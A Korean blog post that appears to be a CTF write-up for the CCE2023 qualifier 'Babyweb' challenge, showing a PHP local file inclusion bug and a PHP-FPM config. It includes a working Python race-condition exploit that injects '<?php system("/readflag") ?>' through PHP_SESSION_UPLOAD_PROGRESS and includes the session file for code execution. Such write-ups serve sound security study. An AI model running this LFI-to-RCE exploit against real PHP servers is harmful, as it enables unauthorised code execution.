---
layout: post
date: 2023-06-11
title: CCE2023 Quals Babyweb write-up
tags: [LFI2RCE, webhacking, ]
categories: [CTF, CCE2023, ]
---

### 취약점 분석


먼저 제공된 파일 중 `index.php`을 보면 GET 파라미터로 넘어온 값을 include 한다는 것을 알 수 있다.


```php
<?php
    $page = $_GET['page'];
    if(isset($page)){
        include("./data/".$page);
    } else {
        header("Location: /?page=1");
    }
?>

```


이를 통해 LFI 취약점을 트리거 할 수 있는데, php 내용을 어디에 쓸 수 있을 지가 고민이었다.


`www.conf`의 내용을 보면 `session.upload_progress.enabled`가 1로 설정되어 있으므로, `PHP_SESSION_UPLOAD_PROGRESS`를 통해 php 코드를 업로드 할 수 있다.


```text
[www]
user = www-data
group = www-data
listen = /run/php/php7.4-fpm.sock
listen.owner = www-data
listen.group = www-data
pm = dynamic
pm.max_children = 48
pm.start_servers = 16
pm.min_spare_servers = 8
pm.max_spare_servers = 16
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[memory_limit] = 32M
php_admin_value[max_execution_time] = 10s
php_admin_value[opcache.enable] = 0
request_terminate_timeout = 15s

```


`session.upload_progress.enabled`옵션은 php 내부에서 업로드 중인 개별 파일의 진행률을 추적하기 위해 사용된다.
해당 옵션이 켜져있으면 `session_start` 함수 없이도 세션 파일을 생성할 수 있으므로 세션 파일을 통해 RCE를 진행할 수 있다.


다만, 해당 문제에서는 `session.upload_progress.cleanup` 옵션이 활성화 되어 있으므로 세션 파일이 바로 삭제된다. 하지만 크기가 큰 파일을 보내고, Race Condition을 통하면 세션 파일을 읽을 수 있다.


### 익스플로잇


```python
import requests
import threading

SERVER = False
url = '<http://localhost:8080>' if not SERVER else "<http://20.196.197.149:8000>"


def read_session():
    while True:
        res = requests.get(
            url + "/?page=../../../../../../../../../../var/lib/php/sessions/sess_lourcode")
        if len(res.text) != 0:
            print(res.text)

def write_session():
    while True:
        res = requests.post(url, files={'PHP_SESSION_UPLOAD_PROGRESS': (None, '<?php system("/readflag") ?>'), 'file': ('lourcode', 'lourcode' * 0x300, 'application/octet-stream', {
                            'Expires': '0'})}, cookies={'PHPSESSID': 'lourcode'})



read = threading.Thread(target=read_session)
read.start()

write = threading.Thread(target=write_session)
write.start()
```


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/7408dda1-cd86-4a3d-ba15-65d01621923b/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20230618%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230618T110900Z&X-Amz-Expires=3600&X-Amz-Signature=11f6fd9541486b237e823251410de5ee2ded425d229483db1daa34198a624bd4&X-Amz-SignedHeaders=host&x-id=GetObject)


플래그를 획득하였다.


### Reference


[https://book.hacktricks.xyz/pentesting-web/file-inclusion/via-php_session_upload_progress](https://book.hacktricks.xyz/pentesting-web/file-inclusion/via-php_session_upload_progress)

